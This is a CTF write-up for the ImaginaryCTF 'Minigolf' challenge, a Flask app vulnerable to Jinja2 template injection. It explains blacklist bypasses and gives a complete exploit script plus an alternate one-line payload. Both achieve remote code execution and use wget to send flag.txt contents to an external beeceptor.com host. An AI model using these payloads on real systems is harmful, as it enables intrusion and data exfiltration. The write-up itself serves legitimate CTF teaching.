# Web - Minigolf (172) - 64 solves

## Challenge

```python
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

So we have a few things blacklisted from the standard SSTI and with a length limitation.
| Blacklist | Bypass |
|-----------|-------------------------|
| {{...}} | {%...%} |
| [...] | \|attr(...) |
| \_\_xxx\_\_ | access via request.args |

However the main problem is still fitting everything into one request. The solution then was to fill `config.items` with our own strings. For example, the RCE payload could be set with

```
config.update(c="wget xxx.beeceptor.com/$(cat flag.txt)")
```

And accessed later via `config.c`

`lipsum` is also a method that is available globally, so to generate a shorter payload instead of `cycler.next` (in the author's intended), we can use `lipsum` as the base object to access the `os` object.

## Full Solution

```python
import requests
from urllib.parse import unquote

url = "http://minigolf.chal.imaginaryctf.org/"

def req(payload):
    r = requests.get(url + "?txt=" + payload)
    t = unquote(r.text)
    t = t.replace('&lt;', '<')
    t = t.replace('&gt;', '>')
    t = t.replace('&#39;', '\'')
    print(t)

pay = """{%if config.update(c=request.args.c)%}{%endif%}&c=wget https://asdfasdfasdf.free.beeceptor.com/$(cat flag.txt)"""
req(pay)
pay = "{%if (lipsum|attr(request.args.d)).os.popen(config.c)%}{%endif%}&d=__globals__"
print("Length:", len(pay.split('&')[0]))
req(pay)
```

## Flag

```
ictf{whats_in_the_flask_tho}
```

## Other solutions

```
{%set a=request.args%}{%set b=(cycler.next|attr(a.g)).os.popen(a.c)%}&g=__globals__&c=wget https://xxx.free.beeceptor.com/`cat f*`
```

- basically combining 2 requests into 1

### References

- https://chowdera.com/2020/12/20201221231521371q.html
- https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can
- https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
